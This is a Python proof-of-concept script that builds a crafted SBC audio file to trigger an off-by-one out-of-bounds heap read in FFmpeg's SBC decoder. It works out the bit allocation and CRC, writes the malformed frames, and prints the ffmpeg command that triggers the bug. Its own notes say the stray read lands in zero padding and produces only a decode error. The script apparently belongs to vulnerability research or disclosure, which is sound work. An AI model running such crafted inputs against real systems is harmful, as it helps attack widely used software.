#!/usr/bin/env python3
"""
PoC generator for VULN 001: Off-by-One OOB Heap Read in sbc_unpack_frame
File: libavcodec/sbcdec.c, lines 175-183
CWE-125: Out-of-bounds Read

Trigger mechanism (NO parser truncation needed):
  - Use MONO, 4 subbands, 4 blocks, SNR allocation, bitpool=5, freq=16kHz
  - SBC parser formula: length = 4 + (4*1)/2 + ceil(4*5/8) = 4 + 2 + 3 = 9 bytes
    → parser delivers a COMPLETE 9-byte frame to the decoder
  - ff_sbc_calculate_bits with SNR, bitpool=5, scale_factors=[2,2,2,2]:
      bits = [3, 2, 2, 0]  (sum=7 per block)
    → total audio bits needed = 4 blocks × 7 = 28 bits
    → payload provides only ceil(4*5/8)*8 = 24 bits
  - Decoder walks the bit stream: after 24 payload bits (consumed=72=len*8):
      Block 3, subband 1, bit 0: guard "72 > 72" is FALSE (bug: should be >=)
      → reads data[72>>3] = data[9] ONE BYTE PAST END of the 9-byte buffer
      → next check "73 > 72" fires → sbc_unpack_frame returns -1 (decode error)

Note on ASAN detection:
  FFmpeg allocates all packets with AV_INPUT_BUFFER_PADDING_SIZE (64) extra
  bytes of zero padding, so data[9] through data[72] are valid (zeroed) memory
  within the allocation.  The single OOB byte falls inside the padding; ASAN
  cannot flag it.  The vulnerability IS exercised (verified by the decode error
  the guard produces one iteration later), but ASAN will not crash.
"""

import struct
import sys

OUTPUT = "vuln_001_input.sbc"
N_FRAMES = 20   # 20 × 9 = 180 bytes; well within one demuxer read, no flush needed


# ---------------------------------------------------------------------------
# CRC-8 matching FFmpeg's AV_CRC_8_EBU:
#   poly=0x1D, init=0x0F, non-reflected (MSB-first)
#   Used by ff_sbc_crc8(ctx, data, len_in_bits) -> av_crc(ctx, 0x0F, ...)
# ---------------------------------------------------------------------------

def _build_crc8_table():
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            if crc & 0x80:
                crc = ((crc << 1) ^ 0x1D) & 0xFF
            else:
                crc = (crc << 1) & 0xFF
        table.append(crc)
    return table

_CRC8_TABLE = _build_crc8_table()


def sbc_crc8(data_bytes, init=0x0F):
    """CRC-8 with poly 0x1D, init 0x0F, MSB-first (matches AV_CRC_8_EBU)."""
    crc = init
    for b in data_bytes:
        crc = _CRC8_TABLE[crc ^ b]
    return crc


# ---------------------------------------------------------------------------
# ff_sbc_calculate_bits simulation (MONO/DUAL branch, SNR mode)
# ---------------------------------------------------------------------------

def calculate_bits_mono_snr(scale_factors, bitpool, subbands=4):
    """Mirrors ff_sbc_calculate_bits for MONO in SNR mode."""
    bitneed = list(scale_factors)
    max_bitneed = max(bitneed) if bitneed else 0

    bitcount = 0
    slicecount = 0
    bitslice = max_bitneed + 1

    while True:
        bitslice -= 1
        bitcount += slicecount
        slicecount = 0
        for sb in range(subbands):
            if bitneed[sb] > bitslice + 1 and bitneed[sb] < bitslice + 16:
                slicecount += 1
            elif bitneed[sb] == bitslice + 1:
                slicecount += 2
        if bitcount + slicecount >= bitpool:
            break

    if bitcount + slicecount == bitpool:
        bitcount += slicecount
        bitslice -= 1

    bits = []
    for sb in range(subbands):
        if bitneed[sb] < bitslice + 2:
            bits.append(0)
        else:
            b = bitneed[sb] - bitslice
            bits.append(min(b, 16))

    # First adjustment
    sb = 0
    while bitcount < bitpool and sb < subbands:
        if bits[sb] >= 2 and bits[sb] < 16:
            bits[sb] += 1
            bitcount += 1
        elif bitneed[sb] == bitslice + 1 and bitpool > bitcount + 1:
            bits[sb] = 2
            bitcount += 2
        sb += 1

    # Second adjustment
    sb = 0
    while bitcount < bitpool and sb < subbands:
        if bits[sb] < 16:
            bits[sb] += 1
            bitcount += 1
        sb += 1

    return bits


# ---------------------------------------------------------------------------
# SBC frame parameters
# ---------------------------------------------------------------------------
SYNC        = 0x9C
FREQ        = 0    # 16 kHz  (bits 7:6 = 00)
BLOCKS_IDX  = 0    # 4 blocks (bits 5:4 = 00)
MODE        = 0    # MONO    (bits 3:2 = 00)
ALLOC       = 1    # SNR     (bit  1   = 1)
SUBBANDS    = 0    # 4 subbands (bit 0 = 0)
BITPOOL     = 5    # key: gives bits=[3,2,2,0] → 28 audio bits in 24-bit payload

FORMAT_BYTE = ((FREQ & 0x3) << 6) | ((BLOCKS_IDX & 0x3) << 4) | \
              ((MODE & 0x3) << 2) | ((ALLOC & 0x1) << 1) | (SUBBANDS & 0x1)

# Scale factors: all set to 2.
# With SNR, bitpool=5, bitneed=[2,2,2,2]:
#   ff_sbc_calculate_bits gives bits=[3,2,2,0]
#   sum(bits)=7 per block; total=28 bits across 4 blocks
#   payload = ceil(4*5/8) = 3 bytes = 24 bits  →  4 bits MISSING
SF_VALUE = 2
SF_BYTE0 = (SF_VALUE << 4) | SF_VALUE   # sf[0][0] | sf[0][1] = 0x22
SF_BYTE1 = (SF_VALUE << 4) | SF_VALUE   # sf[0][2] | sf[0][3] = 0x22

# CRC over [FORMAT_BYTE, BITPOOL, SF_BYTE0, SF_BYTE1] (matches crc_header in sbcdec.c)
crc_header_bytes = bytes([FORMAT_BYTE, BITPOOL, SF_BYTE0, SF_BYTE1])
CRC = sbc_crc8(crc_header_bytes)

# Verify allocation
sf_list    = [SF_VALUE] * 4
allocated  = calculate_bits_mono_snr(sf_list, BITPOOL)
total_audio_bits = 4 * sum(allocated)       # 4 blocks × sum(bits/subband)
payload_bits     = (BITPOOL * 4 + 7) // 8 * 8  # payload bytes × 8
header_bits      = 32 + 4 * 4              # 4-byte header + 4×4-bit SFs
parser_len       = 4 + 2 + (BITPOOL * 4 + 7) // 8  # parser formula

print(f"[*] FORMAT_BYTE        = 0x{FORMAT_BYTE:02X}")
print(f"[*] BITPOOL            = {BITPOOL}")
print(f"[*] CRC                = 0x{CRC:02X}")
print(f"[*] allocated bits/sb  = {allocated}  sum={sum(allocated)}")
print(f"[*] total audio bits   = {total_audio_bits}  (4 blocks × {sum(allocated)} bits)")
print(f"[*] payload bits avail = {payload_bits}  ({payload_bits//8} bytes)")
print(f"[*] parser frame len   = {parser_len} bytes  (COMPLETE frame, no truncation)")
print(f"[*] header+SF bits     = {header_bits}")
print(f"[*] bits deficit       = {total_audio_bits - payload_bits}  (decoder needs more than available)")

# Verify exact OOB position
consumed = header_bits
for blk in range(4):
    for sb in range(4):
        for bit in range(allocated[sb]):
            guard_val = consumed
            if guard_val == parser_len * 8:
                print(f"[!] OOB: consumed={consumed} == len*8={parser_len*8} at blk={blk} sb={sb} bit={bit}")
                print(f"    guard 'consumed > len*8' = '{consumed} > {parser_len*8}' = FALSE  (BUG!)")
                print(f"    reads data[{consumed>>3}] past end of {parser_len}-byte buffer")
            consumed += 1

# ---------------------------------------------------------------------------
# Build the SBC file
# ---------------------------------------------------------------------------
header_bytes   = bytes([SYNC, FORMAT_BYTE, BITPOOL, CRC])
sf_bytes       = bytes([SF_BYTE0, SF_BYTE1])
audio_payload  = bytes([0x00] * ((BITPOOL * 4 + 7) // 8))  # 3 bytes

frame = header_bytes + sf_bytes + audio_payload   # 9 bytes

assert len(frame) == parser_len, f"frame len {len(frame)} != parser len {parser_len}"

file_data = frame * N_FRAMES

with open(OUTPUT, "wb") as f:
    f.write(file_data)

print(f"\n[+] Written {len(file_data)} bytes to {OUTPUT}  ({N_FRAMES} × {len(frame)}-byte frames)")
print(f"    Frame hex: {frame.hex(' ')}")
print()
print("[*] Trigger path:")
print("      ffmpeg -f sbc -i vuln_001_input.sbc -f null -")
print("      Parser delivers COMPLETE 9-byte frames to sbc_decode_frame.")
print("      sbc_unpack_frame(data, frame, 9):")
print("        consumed reaches 72 = 9*8 at block 3 sb 0 (last bit)")
print("        Block 3 sb 1 bit 0: guard '72 > 72' is FALSE (bug)")
print("        → reads data[9] past 9-byte buffer (OOB in padding, not ASAN-visible)")
print("        Block 3 sb 1 bit 1: guard '73 > 72' is TRUE  → returns -1")
print("      sbc_decode_frame returns -1  → FFmpeg logs a decode error per frame")
